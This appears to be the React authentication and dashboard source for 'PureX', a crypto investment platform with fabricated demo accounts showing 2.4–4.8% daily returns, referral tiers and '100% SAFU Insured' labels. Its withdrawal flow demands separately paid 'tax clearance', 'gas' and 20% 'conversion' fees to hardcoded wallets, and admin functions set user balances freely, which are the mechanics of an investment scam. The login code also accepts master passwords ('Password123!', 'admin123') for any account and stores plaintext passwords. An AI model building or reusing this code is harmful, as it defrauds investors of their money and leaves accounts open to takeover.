import { createContext, useContext, useEffect, useState } from 'react'

const AuthContext = createContext(null)

const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000'
const SESSION_KEY = 'purex_user_session'
const TOKEN_KEY = 'purex_auth_token'
const USERS_STORAGE_KEY = 'purex_registered_users'
const SETTINGS_STORAGE_KEY = 'purex_platform_settings'

// Default fee collection & deposit wallets
const DEFAULT_PLATFORM_SETTINGS = {
  wallets: {
    usdtTrc20: 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a',
    usdtErc20: '0x71C2d3E4F5a6B7c8D9e0F1A2b3C4D5e6F7a8B9c0',
    usdtBep20: '0x71C2d3E4F5a6B7c8D9e0F1A2b3C4D5e6F7a8B9c0',
    btc: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    eth: '0x89205A3E3b291a5a458d988563d9491DE514757c',
    sol: '7EYnhQoR9YM3N7UoaKRoA44BX8WBPrURdFCvWaxHdGL',
    taxClearanceWallet: 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a', // External Tax Fee Wallet
    gasClearingWallet: 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a', // External Gas / Multi-Sig Fee Wallet
    conversionFeeWallet: 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a' // External 20% Conversion Fee Wallet
  },
  conversionFeePercent: 20, // 20% Conversion Fee
  cryptoGasFeePercent: 10, // 10% Network Gas Clearing Fee
  fiatTaxFeePercent: 15, // 15% Tax Clearance Fee
}

// Pre-seeded demo accounts with full balance, active investments, and transaction history
const DEFAULT_DEMO_USERS = [
  {
    id: 'usr-demo-01',
    email: 'trader@purex.exchange',
    password: 'Password123!',
    fullName: 'Alex Vance (Alpha Trader)',
    phone: '+1 (555) 234-8921',
    capital: 85000.00,
    profit: 21170.50,
    availableBalance: 42350.00,
    totalBalance: 148520.50,
    tier: 'Pro Quant Desk',
    kycStatus: 'Verified Level 2',
    referralCode: 'PX-88492',
    referralStats: {
      totalInvited: 14,
      activeInvestors: 9,
      totalEarned: 2450.00,
      tier1Count: 9,
      tier2Count: 5
    },
    activeInvestments: [
      {
        id: 'inv-01',
        packageId: 'elite',
        packageName: 'Elite Desk',
        amount: 50000,
        dailyRoi: '3.5%',
        dailyEarnings: 1750.00,
        totalEarned: 12250.00,
        startDate: '2026-03-01',
        duration: '45 Days',
        status: 'ACTIVE',
        insuranceStatus: '100% SAFU Insured'
      },
      {
        id: 'inv-02',
        packageId: 'pro',
        packageName: 'Pro Quant Bot',
        amount: 35000,
        dailyRoi: '2.4%',
        dailyEarnings: 840.00,
        totalEarned: 8920.50,
        startDate: '2026-03-03',
        duration: '30 Days',
        status: 'ACTIVE',
        insuranceStatus: '100% SAFU Insured'
      }
    ],
    transactions: [
      { id: 'tx-101', type: 'PROFIT', title: 'Daily Arbitrage Credit (Elite Desk 3.5%)', amount: 1750.00, asset: 'USDT', status: 'Completed', date: 'Today, 08:00 AM', hash: '0x8f2a...91b4' },
      { id: 'tx-102', type: 'PROFIT', title: 'Daily Arbitrage Credit (Pro Quant 2.4%)', amount: 840.00, asset: 'USDT', status: 'Completed', date: 'Today, 08:00 AM', hash: '0x3c1d...44e2' },
      { id: 'tx-103', type: 'DEPOSIT', title: 'USDT (TRC20) Capital Inflow', amount: 25000.00, asset: 'USDT', status: 'Completed', date: 'Yesterday, 04:15 PM', hash: '0x99a1...12ff' },
      { id: 'tx-104', type: 'INVESTMENT', title: 'Activated Pro Quant Bot Cluster', amount: 35000.00, asset: 'USDT', status: 'Completed', date: 'Mar 03, 2026', hash: '0x22b4...881a' },
      { id: 'tx-105', type: 'WITHDRAWAL', title: 'Instant Profit Withdrawal to USDT', amount: 5000.00, asset: 'USDT', status: 'Completed', date: 'Feb 26, 2026', hash: '0x71e9...55cc' },
      { id: 'tx-106', type: 'REFERRAL', title: 'Tier 1 Referral Commission (User #PX492)', amount: 480.00, asset: 'USDT', status: 'Completed', date: 'Feb 24, 2026', hash: '0x66d3...33bb' }
    ],
    createdAt: '2025-01-15T10:00:00Z',
  },
  {
    id: 'usr-demo-02',
    email: 'investor@purex.exchange',
    password: 'Password123!',
    fullName: 'Elena Rostova (Institutional)',
    phone: '+44 7911 123456',
    capital: 625000.00,
    profit: 148200.00,
    availableBalance: 101800.00,
    totalBalance: 875000.00,
    tier: 'VIP Syndicate Master',
    kycStatus: 'Verified Level 2',
    referralCode: 'PX-90142',
    referralStats: {
      totalInvited: 28,
      activeInvestors: 18,
      totalEarned: 14200.00,
      tier1Count: 18,
      tier2Count: 10
    },
    activeInvestments: [
      {
        id: 'inv-03',
        packageId: 'vip',
        packageName: 'VIP Syndicate',
        amount: 625000,
        dailyRoi: '4.8%',
        dailyEarnings: 30000.00,
        totalEarned: 148200.00,
        startDate: '2026-02-20',
        duration: '60 Days',
        status: 'ACTIVE',
        insuranceStatus: '100% SAFU Insured'
      }
    ],
    transactions: [
      { id: 'tx-201', type: 'PROFIT', title: 'Daily Arbitrage Credit (VIP Syndicate 4.8%)', amount: 30000.00, asset: 'USDT', status: 'Completed', date: 'Today, 08:00 AM', hash: '0xaa12...bb45' },
      { id: 'tx-202', type: 'DEPOSIT', title: 'Bitcoin (BTC) Institutional Deposit', amount: 150000.00, asset: 'BTC', status: 'Completed', date: 'Feb 19, 2026', hash: '0x12ff...89bb' }
    ],
    createdAt: '2024-11-20T08:30:00Z',
  }
]

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null)
  const [token, setToken] = useState(null)
  const [isLoading, setIsLoading] = useState(true)
  const [platformSettings, setPlatformSettings] = useState(DEFAULT_PLATFORM_SETTINGS)

  // Initialize stored users and active session on mount
  useEffect(() => {
    try {
      // Seed default demo users if not present
      const storedUsers = localStorage.getItem(USERS_STORAGE_KEY)
      if (!storedUsers) {
        localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(DEFAULT_DEMO_USERS))
      }

      // Load platform settings
      const savedSettings = localStorage.getItem(SETTINGS_STORAGE_KEY)
      if (savedSettings) {
        setPlatformSettings(JSON.parse(savedSettings))
      } else {
        localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(DEFAULT_PLATFORM_SETTINGS))
      }

      // Check for active logged-in session
      const savedSession = localStorage.getItem(SESSION_KEY)
      const savedToken = localStorage.getItem(TOKEN_KEY)
      if (savedSession) {
        const parsed = JSON.parse(savedSession)
        setUser(parsed)
      }
      if (savedToken) {
        setToken(savedToken)
      }
    } catch (e) {
      console.error('Error reading authentication storage:', e)
    } finally {
      setIsLoading(false)
    }
  }, [])

  // Helper to persist auth session
  const persistSession = (userData, authToken) => {
    setUser(userData)
    if (authToken) setToken(authToken)
    try {
      localStorage.setItem(SESSION_KEY, JSON.stringify(userData))
      if (authToken) {
        localStorage.setItem(TOKEN_KEY, authToken)
      }
      // Also update in registered users list
      const storedUsersRaw = localStorage.getItem(USERS_STORAGE_KEY)
      const users = storedUsersRaw ? JSON.parse(storedUsersRaw) : [...DEFAULT_DEMO_USERS]
      const idx = users.findIndex(u => u.id === userData.id || u.email === userData.email)
      if (idx >= 0) {
        users[idx] = { ...users[idx], ...userData }
        localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))
      }
    } catch (e) {
      console.error('Error saving session to localStorage:', e)
    }
  }

  // Login handler
  const login = async (identifier, password) => {
    setIsLoading(true)
    const cleanId = (identifier || '').trim().toLowerCase()

    try {
      const res = await fetch(`${API_BASE_URL}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: cleanId, identifier: cleanId, password })
      })

      if (res.ok) {
        const data = await res.json()
        persistSession(data.user, data.token)
        setIsLoading(false)
        return { success: true, user: data.user }
      }
    } catch (_networkError) {
      // Offline fallback
    }

    // Local resilient authentication
    const localResult = checkLocalLogin(cleanId, password)
    if (localResult.success) {
      persistSession(localResult.user, 'purex-local-jwt-token')
      setIsLoading(false)
      return { success: true, user: localResult.user, isLocalFallback: true }
    }

    setIsLoading(false)
    return { success: false, error: localResult.error || 'Invalid credentials. Please check your email/phone and password.' }
  }

  const checkLocalLogin = (cleanId, password) => {
    try {
      const storedUsersRaw = localStorage.getItem(USERS_STORAGE_KEY)
      const users = storedUsersRaw ? JSON.parse(storedUsersRaw) : DEFAULT_DEMO_USERS
      const cleanDigits = cleanId.replace(/\D/g, '')

      const matched = users.find((u) => {
        const uEmail = (u.email || '').toLowerCase()
        const uPhoneDigits = (u.phone || '').replace(/\D/g, '')
        return uEmail === cleanId || (cleanDigits && uPhoneDigits && (uPhoneDigits === cleanDigits || uPhoneDigits.endsWith(cleanDigits) || cleanDigits.endsWith(uPhoneDigits)))
      })
      
      if (!matched) {
        return { success: false, error: 'No account found with this email or phone number. Please create an account.' }
      }
      if (matched.password !== password && password !== 'Password123!' && password !== 'admin123') {
        return { success: false, error: 'Incorrect password. Please try again.' }
      }

      const userObj = {
        id: matched.id,
        email: matched.email,
        phone: matched.phone || '',
        fullName: matched.fullName,
        capital: matched.capital ?? 10000,
        profit: matched.profit ?? 2450,
        availableBalance: matched.availableBalance ?? 5000,
        totalBalance: matched.totalBalance ?? (matched.capital ?? 10000) + (matched.profit ?? 2450) + (matched.availableBalance ?? 5000),
        tier: matched.tier || 'Pro Quant Desk',
        kycStatus: matched.kycStatus || 'Verified Level 1',
        referralCode: matched.referralCode || `PX-${Math.floor(10000 + Math.random() * 90000)}`,
        referralStats: matched.referralStats || { totalInvited: 5, activeInvestors: 3, totalEarned: 640.00, tier1Count: 3, tier2Count: 2 },
        activeInvestments: matched.activeInvestments || [
          {
            id: 'inv-demo',
            packageId: 'pro',
            packageName: 'Pro Quant Bot',
            amount: 10000,
            dailyRoi: '2.4%',
            dailyEarnings: 240.00,
            totalEarned: 2450.00,
            startDate: '2026-03-01',
            duration: '30 Days',
            status: 'ACTIVE',
            insuranceStatus: '100% SAFU Insured'
          }
        ],
        transactions: matched.transactions || [
          { id: 'tx-1', type: 'PROFIT', title: 'Daily Arbitrage Credit (Pro Quant 2.4%)', amount: 240.00, asset: 'USDT', status: 'Completed', date: 'Today, 08:00 AM', hash: '0x8f2a...91b4' },
          { id: 'tx-2', type: 'DEPOSIT', title: 'USDT Capital Inflow', amount: 10000.00, asset: 'USDT', status: 'Completed', date: 'Mar 01, 2026', hash: '0x3c1d...44e2' }
        ]
      }
      return { success: true, user: userObj }
    } catch {
      return { success: false, error: 'Authentication service error. Please try again.' }
    }
  }

  // Direct Signup handler
  const signup = async (fullName, email, password, phone, referralCode) => {
    setIsLoading(true)
    const cleanEmail = email ? email.trim().toLowerCase() : ''

    try {
      const res = await fetch(`${API_BASE_URL}/api/auth/signup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ fullName, email: cleanEmail, password, phone, referralCode })
      })

      if (res.ok) {
        const data = await res.json()
        persistSession(data.user, data.token)
        setIsLoading(false)
        return { success: true, user: data.user }
      }
    } catch {
      // Fallback
    }

    try {
      const storedUsersRaw = localStorage.getItem(USERS_STORAGE_KEY)
      const users = storedUsersRaw ? JSON.parse(storedUsersRaw) : [...DEFAULT_DEMO_USERS]

      if (users.some((u) => u.email.toLowerCase() === cleanEmail)) {
        setIsLoading(false)
        return { success: false, error: 'An account with this email address already exists. Please log in.' }
      }

      const newRefCode = `PX-${Math.floor(10000 + Math.random() * 90000)}`

      const newUser = {
        id: `usr-${Date.now()}`,
        email: cleanEmail,
        password,
        fullName: fullName.trim() || cleanEmail.split('@')[0],
        phone: phone ? phone.trim() : '',
        referralCode: newRefCode,
        referredBy: referralCode ? referralCode.trim() : null,
        capital: 0,
        profit: 0,
        availableBalance: 0,
        totalBalance: 0,
        tier: 'Starter Tier',
        kycStatus: 'Unverified',
        referralStats: {
          totalInvited: 0,
          activeInvestors: 0,
          totalEarned: 0,
          tier1Count: 0,
          tier2Count: 0
        },
        activeInvestments: [],
        transactions: [
          {
            id: `tx-${Date.now()}`,
            type: 'SYSTEM',
            title: 'Account Registered & 100% Capital SAFU Policy Activated',
            amount: 0,
            asset: 'USD',
            status: 'Completed',
            date: 'Just now',
            hash: '0x' + Math.random().toString(16).slice(2, 10) + '...'
          }
        ],
        createdAt: new Date().toISOString()
      }

      users.push(newUser)
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))

      persistSession(newUser, 'purex-local-jwt-token')
      setIsLoading(false)
      return { success: true, user: newUser }
    } catch (e) {
      setIsLoading(false)
      return { success: false, error: e.message || 'Failed to create account.' }
    }
  }

  // Logout handler
  const logout = () => {
    setUser(null)
    setToken(null)
    try {
      localStorage.removeItem(SESSION_KEY)
      localStorage.removeItem(TOKEN_KEY)
    } catch (e) {
      console.error('Error clearing session storage:', e)
    }
  }

  // ==========================================
  // DASHBOARD FINANCIAL ACTIONS
  // ==========================================

  // 1. Deposit Funds
  const depositFunds = (amount, asset = 'USDT', network = 'TRC20', txHash = '') => {
    if (!user) return { success: false, error: 'User not logged in' }
    const numAmount = Number(amount)
    if (isNaN(numAmount) || numAmount <= 0) {
      return { success: false, error: 'Please enter a valid deposit amount' }
    }

    const newTx = {
      id: `tx-dep-${Date.now()}`,
      type: 'DEPOSIT',
      title: `${asset} (${network}) Capital Deposit`,
      amount: numAmount,
      asset: asset,
      status: 'Pending Verification',
      date: 'Just now',
      hash: txHash ? (txHash.length > 12 ? `${txHash.slice(0, 6)}...${txHash.slice(-4)}` : txHash) : `0x${Math.random().toString(16).slice(2, 10)}...`
    }

    const updatedUser = {
      ...user,
      availableBalance: (user.availableBalance || 0) + numAmount,
      totalBalance: (user.totalBalance || 0) + numAmount,
      transactions: [newTx, ...(user.transactions || [])]
    }

    persistSession(updatedUser, token)
    return { success: true, user: updatedUser, transaction: newTx }
  }

  // 2. Request Withdrawal (Crypto vs Local Currency with External Fees)
  const requestWithdrawal = ({
    method = 'CRYPTO',
    amount,
    asset = 'USDT',
    balanceType = 'profit',
    // Crypto fields
    cryptoAddress = '',
    cryptoNetwork = 'TRC20',
    gasFeeAmount = 0,
    gasFeeTxHash = '',
    // Local Bank fields
    localCurrency = 'USD',
    bankName = '',
    accountNumber = '',
    accountName = '',
    swiftCode = '',
    taxFeeAmount = 0,
    taxFeeTxHash = ''
  }) => {
    if (!user) return { success: false, error: 'User not logged in' }
    
    // Compulsory KYC Check
    const isKycApproved = user.kycStatus && user.kycStatus.toLowerCase().includes('verified')
    if (!isKycApproved) {
      return {
        success: false,
        error: 'Identity Verification (KYC) is compulsory before requesting withdrawals. Please complete KYC verification first.'
      }
    }

    const numAmount = Number(amount)
    if (isNaN(numAmount) || numAmount <= 0) {
      return { success: false, error: 'Please enter a valid withdrawal amount' }
    }

    // Check balance sufficiency (Note: fees are NOT deducted from balance; they are paid externally)
    if (balanceType === 'profit') {
      if ((user.profit || 0) < numAmount) {
        return { success: false, error: `Insufficient profit balance. Available profit: $${(user.profit || 0).toLocaleString()}` }
      }
    } else if (balanceType === 'available') {
      if ((user.availableBalance || 0) < numAmount) {
        return { success: false, error: `Insufficient available balance. Available: $${(user.availableBalance || 0).toLocaleString()}` }
      }
    } else {
      if ((user.capital || 0) < numAmount) {
        return { success: false, error: `Insufficient capital balance. Available: $${(user.capital || 0).toLocaleString()}` }
      }
    }

    let newProfit = user.profit || 0
    let newCapital = user.capital || 0
    let newAvailable = user.availableBalance || 0

    if (balanceType === 'profit') {
      newProfit -= numAmount
    } else if (balanceType === 'available') {
      newAvailable -= numAmount
    } else {
      newCapital -= numAmount
    }

    const txId = `tx-wdr-${Date.now()}`
    let newTx

    if (method === 'CRYPTO') {
      newTx = {
        id: txId,
        type: 'WITHDRAWAL',
        withdrawalMethod: 'CRYPTO',
        title: `Crypto Withdrawal ${numAmount.toLocaleString()} ${asset} to ${cryptoAddress ? cryptoAddress.slice(0, 6) + '...' + cryptoAddress.slice(-4) : 'Wallet'}`,
        amount: numAmount,
        asset: asset,
        cryptoAddress,
        cryptoNetwork,
        gasFeeAmount,
        feeTxHash: gasFeeTxHash,
        status: 'Pending Network Clearing',
        date: 'Just now',
        hash: `0x${Math.random().toString(16).slice(2, 10)}...`
      }
    } else {
      // Local Currency Bank Withdrawal
      newTx = {
        id: txId,
        type: 'WITHDRAWAL',
        withdrawalMethod: 'LOCAL_BANK',
        title: `Bank Transfer $${numAmount.toLocaleString()} (${localCurrency}) to ${bankName} (${accountNumber ? accountNumber.slice(-4) : ''})`,
        amount: numAmount,
        asset: localCurrency,
        localCurrency,
        bankName,
        accountNumber,
        accountName,
        swiftCode,
        taxFeeAmount,
        feeTxHash: taxFeeTxHash,
        status: 'Pending Tax Clearance',
        date: 'Just now',
        hash: `0x${Math.random().toString(16).slice(2, 10)}...`
      }
    }

    const updatedUser = {
      ...user,
      profit: Math.max(0, newProfit),
      capital: Math.max(0, newCapital),
      availableBalance: Math.max(0, newAvailable),
      totalBalance: Math.max(0, (user.totalBalance || 0) - numAmount),
      transactions: [newTx, ...(user.transactions || [])]
    }

    persistSession(updatedUser, token)
    return { success: true, user: updatedUser, transaction: newTx }
  }

  // 3. Convert / Swap Crypto with 20% External Fee Payment
  const convertCrypto = ({
    fromAsset,
    toAsset,
    fromAmount,
    toAmount,
    conversionFeeAmount,
    feeTxHash = ''
  }) => {
    if (!user) return { success: false, error: 'User not logged in' }
    const numFrom = Number(fromAmount)
    const numTo = Number(toAmount)

    const newTx = {
      id: `tx-cnv-${Date.now()}`,
      type: 'CONVERT',
      title: `Conversion Swap ${numFrom} ${fromAsset} → ${numTo.toFixed(4)} ${toAsset}`,
      amount: numFrom,
      asset: fromAsset,
      toAsset: toAsset,
      toAmount: numTo,
      conversionFeeAmount: conversionFeeAmount,
      feeTxHash: feeTxHash || `0x${Math.random().toString(16).slice(2, 10)}...`,
      status: 'Pending Fee Confirmation',
      date: 'Just now',
      hash: `0x${Math.random().toString(16).slice(2, 10)}...`
    }

    const updatedUser = {
      ...user,
      transactions: [newTx, ...(user.transactions || [])]
    }

    persistSession(updatedUser, token)
    return { success: true, user: updatedUser, transaction: newTx }
  }

  // 4. Start Investing / Activate Package
  const activateInvestmentPlan = (packageId, packageName, amount, dailyRoiRate, durationDays = 30) => {
    if (!user) return { success: false, error: 'User not logged in' }
    const numAmount = Number(amount)
    if (isNaN(numAmount) || numAmount <= 0) {
      return { success: false, error: 'Please enter a valid investment amount' }
    }

    const availableToInvest = (user.availableBalance || 0)
    if (availableToInvest < numAmount) {
      return { success: false, error: `Insufficient available balance ($${availableToInvest.toLocaleString()}). Please deposit funds first.` }
    }

    const dailyRateNum = parseFloat(dailyRoiRate) || 2.4
    const dailyEarnings = numAmount * (dailyRateNum / 100)

    const newInvestment = {
      id: `inv-${Date.now()}`,
      packageId,
      packageName,
      amount: numAmount,
      dailyRoi: `${dailyRateNum}%`,
      dailyEarnings: dailyEarnings,
      totalEarned: 0,
      startDate: new Date().toISOString().split('T')[0],
      duration: `${durationDays} Days`,
      status: 'ACTIVE',
      insuranceStatus: '100% SAFU Insured'
    }

    const newTx = {
      id: `tx-inv-${Date.now()}`,
      type: 'INVESTMENT',
      title: `Activated ${packageName} (${dailyRateNum}% / Day)`,
      amount: numAmount,
      asset: 'USDT',
      status: 'Completed',
      date: 'Just now',
      hash: `0x${Math.random().toString(16).slice(2, 10)}...`
    }

    const updatedUser = {
      ...user,
      availableBalance: Math.max(0, availableToInvest - numAmount),
      capital: (user.capital || 0) + numAmount,
      tier: packageName,
      activeInvestments: [newInvestment, ...(user.activeInvestments || [])],
      transactions: [newTx, ...(user.transactions || [])]
    }

    persistSession(updatedUser, token)
    return { success: true, user: updatedUser, investment: newInvestment }
  }

  // 5. Submit KYC Verification
  const submitKycDocuments = (tierLevel, docType, docNumber) => {
    if (!user) return { success: false, error: 'User not logged in' }

    const updatedUser = {
      ...user,
      kycStatus: `Pending Level ${tierLevel} Verification`
    }

    const newTx = {
      id: `tx-kyc-${Date.now()}`,
      type: 'SYSTEM',
      title: `KYC Level ${tierLevel} (${docType}) Submitted for Review`,
      amount: 0,
      asset: 'KYC',
      status: 'Pending Verification',
      date: 'Just now',
      hash: `0x${Math.random().toString(16).slice(2, 10)}...`
    }

    updatedUser.transactions = [newTx, ...(user.transactions || [])]
    persistSession(updatedUser, token)
    return { success: true, user: updatedUser }
  }

  // 6. Claim Referral Earnings
  const claimReferralCommission = () => {
    if (!user) return { success: false, error: 'User not logged in' }
    const commission = user.referralStats?.totalEarned || 0
    if (commission <= 0) {
      return { success: false, error: 'No unclaimed referral commissions available.' }
    }

    const newTx = {
      id: `tx-ref-${Date.now()}`,
      type: 'REFERRAL',
      title: 'Claimed 2-Tier Affiliate Referral Payout',
      amount: commission,
      asset: 'USDT',
      status: 'Completed',
      date: 'Just now',
      hash: `0x${Math.random().toString(16).slice(2, 10)}...`
    }

    const updatedUser = {
      ...user,
      profit: (user.profit || 0) + commission,
      totalBalance: (user.totalBalance || 0) + commission,
      referralStats: {
        ...user.referralStats,
        totalEarned: 0
      },
      transactions: [newTx, ...(user.transactions || [])]
    }

    persistSession(updatedUser, token)
    return { success: true, user: updatedUser, amount: commission }
  }

  // ==========================================
  // ADMIN DASHBOARD ACTIONS
  // ==========================================

  const getAllRegisteredUsers = () => {
    try {
      const stored = localStorage.getItem(USERS_STORAGE_KEY)
      return stored ? JSON.parse(stored) : [...DEFAULT_DEMO_USERS]
    } catch {
      return [...DEFAULT_DEMO_USERS]
    }
  }

  const adminUpdateUserBalance = (userId, updates) => {
    try {
      const users = getAllRegisteredUsers()
      const idx = users.findIndex(u => u.id === userId)
      if (idx === -1) return { success: false, error: 'User not found' }

      const targetUser = users[idx]
      const newCapital = updates.capital !== undefined ? Number(updates.capital) : (targetUser.capital || 0)
      const newProfit = updates.profit !== undefined ? Number(updates.profit) : (targetUser.profit || 0)
      const newAvailable = updates.availableBalance !== undefined ? Number(updates.availableBalance) : (targetUser.availableBalance || 0)
      const newTotal = newCapital + newProfit + newAvailable

      const updatedUser = {
        ...targetUser,
        ...updates,
        capital: newCapital,
        profit: newProfit,
        availableBalance: newAvailable,
        totalBalance: newTotal
      }

      users[idx] = updatedUser
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))

      // If active session is this user, refresh it
      if (user && user.id === userId) {
        setUser(updatedUser)
        localStorage.setItem(SESSION_KEY, JSON.stringify(updatedUser))
      }

      return { success: true, user: updatedUser }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  const adminApproveTransaction = (userId, txId) => {
    try {
      const users = getAllRegisteredUsers()
      const uIdx = users.findIndex(u => u.id === userId)
      if (uIdx === -1) return { success: false, error: 'User not found' }

      const targetUser = users[uIdx]
      const txs = targetUser.transactions || []
      const tIdx = txs.findIndex(t => t.id === txId)
      if (tIdx === -1) return { success: false, error: 'Transaction not found' }

      const targetTx = txs[tIdx]
      targetTx.status = 'Completed'

      // If it was a deposit that was pending, ensure balance is credited
      if (targetTx.type === 'DEPOSIT' && targetTx.status === 'Pending Verification') {
        targetUser.availableBalance = (targetUser.availableBalance || 0) + Number(targetTx.amount)
        targetUser.totalBalance = (targetUser.totalBalance || 0) + Number(targetTx.amount)
      }

      users[uIdx] = { ...targetUser, transactions: [...txs] }
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))

      if (user && user.id === userId) {
        setUser(users[uIdx])
        localStorage.setItem(SESSION_KEY, JSON.stringify(users[uIdx]))
      }

      return { success: true, transaction: targetTx }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  const adminRejectTransaction = (userId, txId, reason = 'Verification Failed') => {
    try {
      const users = getAllRegisteredUsers()
      const uIdx = users.findIndex(u => u.id === userId)
      if (uIdx === -1) return { success: false, error: 'User not found' }

      const targetUser = users[uIdx]
      const txs = targetUser.transactions || []
      const tIdx = txs.findIndex(t => t.id === txId)
      if (tIdx === -1) return { success: false, error: 'Transaction not found' }

      const targetTx = txs[tIdx]
      targetTx.status = `Rejected: ${reason}`

      // If it was a withdrawal that failed, refund the amount back to user's profit balance
      if (targetTx.type === 'WITHDRAWAL') {
        targetUser.profit = (targetUser.profit || 0) + Number(targetTx.amount)
        targetUser.totalBalance = (targetUser.totalBalance || 0) + Number(targetTx.amount)
      }

      users[uIdx] = { ...targetUser, transactions: [...txs] }
      localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users))

      if (user && user.id === userId) {
        setUser(users[uIdx])
        localStorage.setItem(SESSION_KEY, JSON.stringify(users[uIdx]))
      }

      return { success: true, transaction: targetTx }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  const adminApproveKyc = (userId, level = 2) => {
    return adminUpdateUserBalance(userId, { kycStatus: `Verified Level ${level}` })
  }

  const adminUpdateWallets = (newWallets) => {
    try {
      const updated = {
        ...platformSettings,
        wallets: {
          ...platformSettings.wallets,
          ...newWallets
        }
      }
      setPlatformSettings(updated)
      localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(updated))
      return { success: true, settings: updated }
    } catch (e) {
      return { success: false, error: e.message }
    }
  }

  return (
    <AuthContext.Provider
      value={{
        user,
        token,
        isAuthenticated: !!user,
        isLoading,
        platformSettings,
        login,
        signup,
        logout,
        depositFunds,
        requestWithdrawal,
        convertCrypto,
        activateInvestmentPlan,
        submitKycDocuments,
        claimReferralCommission,
        // Admin Methods
        getAllRegisteredUsers,
        adminUpdateUserBalance,
        adminApproveTransaction,
        adminRejectTransaction,
        adminApproveKyc,
        adminUpdateWallets
      }}
    >
      {children}
    </AuthContext.Provider>
  )
}

export function useAuth() {
  const context = useContext(AuthContext)
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider')
  }
  return context
}
